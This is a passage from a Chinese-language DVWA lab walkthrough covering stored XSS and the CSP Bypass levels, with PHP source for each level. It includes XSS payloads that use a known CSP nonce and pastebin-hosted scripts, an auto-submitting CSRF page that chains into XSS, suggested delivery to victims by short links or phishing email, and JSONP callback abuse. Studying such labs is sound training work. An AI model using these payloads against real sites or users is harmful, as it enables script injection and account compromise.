punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Update database</span>
    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO guestbook ( comment, name ) VALUES ( '<span class="token interpolation"><span class="token variable">$message</span></span>', '<span class="token interpolation"><span class="token variable">$name</span></span>' );"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre>'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre>'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">//mysql_close();</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里同样对message做出了严格的过滤，但对name只是单纯过滤了<script>标签，这并没有什么用</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212626709.png" alt="image-20240112212626709"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240112212549693.png" alt="image-20240112212549693"></p>
<h2 id="Impossible-12">Impossible</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'btnSign'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'mtxMessage'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span>    <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'txtName'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize message input</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$message</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$message</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Sanitize name input</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$name</span> <span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">trigger_error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span><span class="token punctuation">,</span> <span class="token constant">E_USER_ERROR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">""</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span> <span class="token variable">$name</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Update database</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':message'</span><span class="token punctuation">,</span> <span class="token variable">$message</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':name'</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>防止CSRF，SQL注入，同时对message与name的内容都做出了相同且严格的过滤，这是无法绕过的</p>
<h1>0x13 CSP Bypass</h1>
<p>内容安全策略（CSP）使服务器管理员可以通过指定浏览器应认为是可执行脚本的有效源的域来减少或消除XSS可能发生的向量。然后，兼容CSP的浏览器将仅执行从这些允许列出的域接收的源文件中加载的脚本，忽略所有其他脚本（包括内联脚本和事件处理HTML属性）。</p>
<p>除了限制可以从中加载内容的域之外，服务器还可以指定允许使用哪些协议; 例如（理想情况下，从安全角度来看），服务器可以指定必须使用HTTPS加载所有内容。完整的数据传输安全策略不仅包括强制HTTPS进行数据传输，还包括使用安全标记标记所有cookie，并提供从HTTP页面到其HTTPS对应项的自动重定向。站点还可以使用Strict-Transport-SecurityHTTP标头来确保浏览器仅通过加密通道连接到它们。</p>
<p>两种方法可以启用 CSP。</p>
<ul>
<li>一种是通过 HTTP 头信息的Content-Security-Policy的字段。</li>
<li>一种是通过网页的<meta>标签</li>
</ul>
<h2 id="Low-13">Low</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;"</span><span class="token punctuation">;</span> <span class="token comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># These might work if you can't create your own for some reason</span>
<span class="token comment"># https://pastebin.com/raw/R570EE00</span>
<span class="token comment"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span>
<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
    &lt;script src='"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/script>
"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST">
    &lt;p>You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p>
    &lt;input size="50" type="text" name="include" value="" id="include" />
    &lt;input type="submit" value="Include" />
&lt;/form>
'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里可以看到网站通过添加HTTP头信息的Content-Security-Policy的字段来开启CSP：<a target="_blank" rel="noopener" href="http://xn--pastebin-gq8mn0iju0dl0mivas85ctj0bj15alpd77ea6699apxw59d8q1dtnf.com">要求本页面只能加载来自自身的或者pastebin.com</a>, <a target="_blank" rel="noopener" href="http://hastebin.com">hastebin.com</a>, jquery and google analytics.这些网站的js脚本代码</p>
<p>其中 <a target="_blank" rel="noopener" href="http://pastebin.com">pastebin.com</a> 是一个快速分享文本内容的网站，这个内容我们是可控的，可以在这里面插入 XSS 攻击语句：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//pastebin.com/raw/dtZzx4TF</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我们在上述网站构造XSS语句，之后记录下生成的网址，接着放入DVWA的文本输入框中，点击include即可触发XSS，但我这里不知为何没有反应</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113153131110.png" alt="image-20240113153131110"></p>
<p>这里还可以配合 CSRF 让攻击更加自动化：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://127.0.0.1:8888/vulnerabilities/csp/<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csp<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>include<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
  <span class="token keyword">var</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"csp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  form<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">"https://pastebin.com/raw/ZFnbmjBU"</span><span class="token punctuation">;</span>
  form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>将上述内容保存为 csrf.html 然后上传到公网服务器上</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">https</span><span class="token punctuation">:</span><span class="token comment">//www.yourwebsite.com/csrf.html</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将这个地址想方设法让受害者访问的话，就会自动触发 CSRF 和 XSS 攻击。这里可以采用短网址、钓鱼邮件等方法</p>
<h2 id="Medium-13">Medium</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self' 'unsafe-inline' 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=';"</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Disable XSS protections so that inline alert boxes will work</span>
<span class="token function">header</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"X-XSS-Protection: 0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment"># &lt;script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert(1)&lt;/script></span>

<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
    "</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST">
    &lt;p>Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p>
    &lt;input size="50" type="text" name="include" value="" id="include" />
    &lt;input type="submit" value="Include" />
&lt;/form>
'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li><strong>script-src ‘self’</strong>: 指定允许执行 JavaScript 代码的来源。在这里，<code>'self'</code> 表示只允许从同一域名加载脚本。</li>
<li><strong>‘unsafe-inline’</strong>: 允许内联脚本的执行，即在 HTML 中直接嵌入的脚本。</li>
<li><strong>‘nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=’</strong>: 使用 nonce（一次性随机值）来标识允许执行的脚本。在这里，指定了一个特定的 nonce 值。只有包含这个 nonce 的脚本才会被执行。</li>
</ol>
<p>由于这一关允许内联脚本执行，因此我们直接构造XSS即可，但要注意需要包含上述指定的nonce值</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;script nonce=<span class="token string">"TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA="</span>><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'hacker'</span><span class="token punctuation">)</span>&lt;/script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113154138486.png" alt="image-20240113154138486"></p>
<p>之后直接输入文本框提交即可</p>
<h2 id="High-13">High</h2>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$headerCSP</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Content-Security-Policy: script-src 'self';"</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token variable">$headerCSP</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
    "</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST">
    &lt;p>The page makes a call to '</span> <span class="token operator">.</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p>
    &lt;p>1+2+3+4+5=&lt;span id="answer">&lt;/span>&lt;/p>
    &lt;input type="button" id="solve" value="Solve the sum" />
&lt;/form>

&lt;script src="source/high.js">&lt;/script>
'</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里做出了严格的限制，只允许加载来自自身网站的js脚本，但好在页面中有如下提示</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">The page makes a call to ../..<span class="token comment">//vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>说这个网站页面会加载<code>vulnerabilities/csp/source/jsonp.php</code>下的php的代码，对应内容如下</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"callback"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$outp</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"answer"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$callback</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"("</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$outp</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>判断变量callback是否存在与get传参中，如果存在的话，则会与js解码出来的数据一同拼接输出</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113160033855.png" alt="image-20240113160033855"></p>
<p>同时页面代码还存在自动加载high.js文件，我们追踪看看</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    s<span class="token operator">.</span>src <span class="token operator">=</span> <span class="token string double-quoted-string">"source/jsonp.php?callback=solveSum"</span><span class="token punctuation">;</span>
    document<span class="token operator">.</span>body<span class="token operator">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">solveSum</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"answer"</span> in obj<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		document<span class="token operator">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"answer"</span><span class="token punctuation">)</span><span class="token operator">.</span>innerHTML <span class="token operator">=</span> obj<span class="token punctuation">[</span><span class="token string single-quoted-string">'answer'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">var</span> solve_button <span class="token operator">=</span> document<span class="token operator">.</span><span class="token function">getElementById</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"solve"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>solve_button<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	solve_button<span class="token operator">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里表名，当我们点击id为solve的元素之后，便会调用clickButton函数，solve位置如下</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113160344909.png" alt="image-20240113160344909"></p>
<p>该函数会创建一个script标签：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss">&lt;script src=<span class="token string">"http://127.0.0.1/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum"</span>>&lt;/script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个时候浏览器就会发起如下请求：</p>
<pre class="line-numbers language-scss" data-language="scss"><code class="language-scss"><span class="token property">http</span><span class="token punctuation">:</span><span class="token comment">//127.0.0.1/dvwa/vulnerabilities/csp/source/jsonp.php?callback=solveSum</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>访问这个 jsonp.php 会得到如下请求：</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240113161028991.png" alt="image-20240113161028991"></p>
<p>如果我们将callback改为alert之类的，就会触发弹窗，那接下来就是想办法如何修改callback参数了</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string double-quoted-string">"
